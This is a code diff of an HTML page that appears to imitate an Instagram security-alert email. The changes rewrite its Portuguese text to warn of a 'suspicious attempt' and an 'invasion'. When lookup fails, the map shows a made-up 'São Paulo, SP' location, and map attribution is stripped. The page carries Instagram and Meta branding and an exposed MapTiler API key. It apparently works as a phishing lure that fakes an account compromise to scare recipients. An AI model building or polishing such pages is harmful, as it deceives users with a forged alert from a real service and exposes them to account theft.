@@ -10,7 +10,6 @@
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
             padding: 0;
-            background-color: #fafafa;
             color: #262626;
         }
         .container {
@@ -29,7 +28,7 @@
         #map {
             height: 200px;
             width: 100%;
-            border-radius: 8px;
+            border-radius: 10px;
             margin-bottom: 20px;
         }
         .details {
@@ -86,8 +85,8 @@
         }
         .footer-img {
             display: block;
-            margin: 150px auto 10px auto;
-            width: 50px;
+            margin: 100px auto 10px auto;
+            width: 48px;
             height: auto;
         }
     </style>
@@ -118,9 +117,9 @@
                             target="_blank"
                             data-saferedirecturl="https://www.instagram.com/"
                             ><img
-                                width="30"
-                                src="https://ci3.googleusercontent.com/meips/ADKq_NaHUrONOGM6CfnTAphjyIEfvg79xPJ_Utn8a-kbiR3vWpk9pe0uNSLkOjWy5udLTqUeSxrGHPyGmPbRADNXjl7-95cZjYm2t0Kl7rQnYrlDp6V0Fw4BcSeHWyru37yUFPBxjR2M7d4o5-3I24E_lsWo2HGRePe_mxRqpXGSnQTqlcR-nx8b8ADwhwmRDt8C3zQOH5V0_bnG4wXoI2vxVWU1bi5n9SrlJejADGea6pTkoU7xp6-v3crZME_ugysMp2VVbgpuBZhmRI7vW1iIj15YSk5CCRcQOFQio9ZC0gENMboOKMnBY2OT0HaJNvDcoEODBwlvUYqEWSK-UT9FLDf5LhYprr_w4fue5PDHGxLJNzwEiIsifoAS1NEMSJTkN0HV8DS56jA2Hiiu8U6_Llzm3X5xN527X-_sWT5ADGXl3Apk3TUkqUaoOIGD7bKCH_gjrz3mR8hVKu-w0L2tF3J9qYezCwd9UL7xf1hedZ6IoAKaPhSbugLM53VDAijIVIePdNgBLodPkk8dpkQ=s0-d-e1-ft#https://scontent.xx.fbcdn.net/v/t51.2885-15/473138964_1154527659623778_6070265251187649159_n.jpg?_nc_cat=108&amp;ccb=1-7&amp;_nc_sid=7d201b&amp;_nc_ohc=uIxRJMICsuMQ7kNvgGL1FDA&amp;_nc_oc=AdgAvq9UQEzZdG5aqIoNpHx2EIdxRazqvQumYMqsNvX9DxIKjWM-IqG98kVewYmquz36-1cha4iyoapXXQ81Fsd1&amp;_nc_ad=z-m&amp;_nc_cid=0&amp;_nc_zt=23&amp;_nc_ht=scontent.xx&amp;oh=00_AYAJ1zHA_-SgygSN_yGaO-ARsgZ_n4nNUfP0Kp3_QLaDAQ&amp;oe=67AA6E12"
-                                height="30"
+                                width="40"
+                                src="./foto.jpg"
+                                height="40"
                                 style="border: 0px; border-radius: 18px; vertical-align: middle;"
                                 class="CToWUd"
                                 data-bit="iit"
@@ -143,12 +142,12 @@
 
         <!-- Informação Adicional -->
         <div class="details">
-            <p style="font-size: 16px; color: #262626; font-weight: 600; margin-bottom: 10px;">Onde você se conectou</p>
+            <p style="font-size: 16px; color: #262626; font-weight: 600; margin-bottom: 10px;">Onde houve a tentativa suspeita</p>
             <div class="location-info">
                 <img src="https://aacelpe.com.br/wp-content/uploads/2022/07/Localizacao-PNG.png" alt="Pin de localização" class="location-icon">
                 <div class="location-text">
                     <p><strong id="location">Carregando localização...</strong><br>
-                    <span class="online-now">Online agora</span> • Windows</p>
+                    <span class="">Ativo a 10 minutos atrás</span> • Máquina Linux</p>
                 </div>
             </div>
         </div>
@@ -157,7 +156,7 @@
       
         <img src="./rodape-img.png" alt="Rodapé" class="footer-img">
         <div
-        style="color: #abadae;text-align: center; font-size: 11px; margin: 0 auto 5px auto"
+        style="color: #abadae;text-align: center; font-size: 10px; margin: 0 auto 5px auto"
       >
         © <span class="il">Instagram</span>. Meta Platforms, Inc., 1601
         Willow Road, Menlo Park, CA 94025<br />
@@ -173,7 +172,7 @@
                 const data = await response.json();
 
                 if (!data.city || !data.state) {
-                    console.error("Erro ao carregar localização.");
+                    console.error("São Paulo, SP.");
                     document.getElementById('location').innerText = "Localização não disponível";
                     return;
                 }
@@ -186,23 +185,28 @@
 
             } catch (error) {
                 console.error(error);
-                document.getElementById('location').innerText = "Erro ao carregar localização";
+                document.getElementById('location').innerText = "São Paulo, SP";
             }
         }
 
-        // Função para inicializar o mapa
+        // Função para inicializar o mapa com estilo semelhante ao Google Maps
+       // Função para inicializar o mapa com estilo semelhante ao Google Maps
         function initMap(lat, lng) {
-            const map = L.map('map').setView([lat, lng], 14);
+            // Inicializa o mapa sem o controle de atribuição (bandeira e texto "Leaflet")
+            const map = L.map('map', {
+                attributionControl: false // Desativa o controle de atribuição padrão
+            }).setView([lat, lng], 16);
 
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                attribution: '© OpenStreetMap contributors'
+            // Usando o estilo "Streets" do MapTiler (parecido com Google Maps)
+            L.tileLayer('https://api.maptiler.com/maps/streets/{z}/{x}/{y}.png?key=PB8zg2KKYnEIruvEg2wc', {
+                attribution: '' // Remove a atribuição do tileLayer
             }).addTo(map);
 
+            // Adiciona um marcador
             L.marker([lat, lng]).addTo(map)
-                .bindPopup('Localização aproximada do login.')
+                .bindPopup('Localização aproximada da invasão.')
                 .openPopup();
         }
-
         // Funções para os botões
         function confirmLogin() {
             // Redirecionar para a página inicial ou dashboard
